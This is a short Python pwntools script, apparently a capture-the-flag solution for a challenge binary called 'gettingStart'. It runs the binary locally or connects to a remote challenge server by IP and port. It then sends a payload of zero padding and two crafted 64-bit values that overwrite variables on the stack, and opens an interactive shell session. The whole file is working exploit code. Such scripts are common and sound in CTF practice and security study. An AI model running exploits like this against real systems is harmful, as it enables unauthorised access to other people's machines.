#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./task_gettingStart_ktQeERc"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./task_gettingStart_ktQeERc")
else:
    io = remote("49.4.78.132", 30993)

if __name__ == "__main__":
    payload = flat(0, 0, 0, 0x7FFFFFFFFFFFFFFF, 0x3FB999999999999A)
    #  gdb.attach(io, "bpie 0xA3A\nc")
    io.sendlineafter("you.\n", payload)

    io.interactive()
